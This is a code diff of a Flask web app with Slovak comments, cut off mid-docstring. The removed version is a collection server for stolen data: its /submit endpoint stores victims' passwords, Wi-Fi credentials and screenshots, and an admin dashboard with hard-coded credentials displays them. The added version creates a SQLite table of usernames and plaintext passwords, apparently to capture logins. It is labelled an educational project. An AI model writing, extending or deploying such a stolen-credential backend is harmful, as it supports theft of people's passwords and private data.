@@ -1,116 +1,35 @@
-from flask import Flask, request, jsonify, render_template, redirect, url_for, session
-from functools import wraps
-import os
-import json
-from datetime import datetime
-from io import BytesIO
-import base64
+import sqlite3
+import random
+import string
+from flask import Flask, render_template, request, redirect, url_for, session
 
+# Inicializácia Flask aplikácie
 app = Flask(__name__)
-app.secret_key = os.environ.get("SECRET_KEY", "supertajnykluc123")
-DATA_FILE = "data.json"
+# Nastav tajný kľúč pre session, v reálnom projekte by mal byť komplexný a utajený
+app.secret_key = 'super_tajny_kluc_vzdelavacie_projekt' 
 
-def load_data():
-    if not os.path.exists(DATA_FILE):
-        return []
-    try:
-        with open(DATA_FILE, "r", encoding="utf-8") as f:
-            return json.load(f)
-    except:
-        return []
+# Heslo na prístup k stránke s dátami
+DATA_PAGE_PASSWORD = 'mojetajneheslo123'
 
-def save_data(data):
-    try:
-        with open(DATA_FILE, "w", encoding="utf-8") as f:
-            json.dump(data, f, indent=2, ensure_ascii=False)
-    except:
-        pass
+def get_db_connection():
+    """Vytvorí pripojenie k SQLite databáze."""
+    conn = sqlite3.connect('database.db')
+    conn.row_factory = sqlite3.Row
+    return conn
 
-def login_required(f):
-    @wraps(f)
-    def decorated_function(*args, **kwargs):
-        if 'logged_in' not in session:
-            return redirect(url_for('login'))
-        return f(*args, **kwargs)
-    return decorated_function
+def init_db():
+    """Inicializuje databázu a vytvorí tabuľku, ak ešte neexistuje."""
+    conn = get_db_connection()
+    conn.execute('''
+        CREATE TABLE IF NOT EXISTS logins (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            username TEXT NOT NULL,
+            password TEXT NOT NULL,
+            code TEXT NOT NULL UNIQUE
+        );
+    ''')
+    conn.commit()
+    conn.close()
 
-@app.route('/submit', methods=['POST'])
-def submit_data():
-    try:
-        data = request.json
-        if not data:
-            return jsonify({"error": "No data"}), 400
-
-        data['received_at'] = datetime.utcnow().isoformat() + "Z"
-        
-        # Kompatibilita
-        if 'passwords' in data:
-            data['stolen_data'] = data.pop('passwords')
-        if 'stolen_data' not in data:
-            data['stolen_data'] = []
-        if 'wifi_password' not in data:
-            data['wifi_password'] = None
-
-        current_data = load_data()
-        current_data.append(data)
-        save_data(current_data)
-        
-        print(f"✅ {data.get('user')} | WiFi: {data.get('wifi_ssid')} | {len(data.get('stolen_data', []))} hesiel")
-        return jsonify({"status": "ok"}), 200
-        
-    except Exception as e:
-        print(f"❌ /submit: {e}")
-        return jsonify({"error": str(e)}), 500
-
-@app.route('/login', methods=['GET', 'POST'])
-def login():
-    error = None
-    if request.method == 'POST':
-        username = request.form.get('username')
-        password = request.form.get('password')
-        if username == 'u-Admin' and password == '120202810428Jm!':
-            session['logged_in'] = True
-            return redirect(url_for('dashboard'))
-        else:
-            error = "❌ Nesprávne meno alebo heslo!"
-    return render_template('login.html', error=error)
-
-@app.route('/logout')
-def logout():
-    session.pop('logged_in', None)
-    return redirect(url_for('login'))
-
-@app.route('/')
-@login_required
-def dashboard():
-    data = load_data()
-    data = sorted(data, key=lambda x: x.get('received_at', ''), reverse=True)
-    return render_template('admin.html', data=data)
-
-@app.route('/detail/<int:index>')
-@login_required
-def detail(index):
-    data = load_data()
-    if index < 0 or index >= len(data):
-        return "Not found", 404
-    entry = data[index]
-    return render_template('detail.html', entry=entry, index=index)
-
-@app.route('/screenshot/<int:index>')
-@login_required
-def screenshot(index):
-    data = load_data()
-    if index < 0 or index >= len(data):
-        return "No screenshot", 404
-    entry = data[index]
-    b64 = entry.get('screenshot')
-    if not b64:
-        return "No screenshot", 404
-    try:
-        img_bytes = base64.b64decode(b64)
-        return send_file(BytesIO(img_bytes), mimetype='image/png')
-    except:
-        return "Invalid screenshot", 404
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=True)
+def generate_code(length=6):
+    """Vy
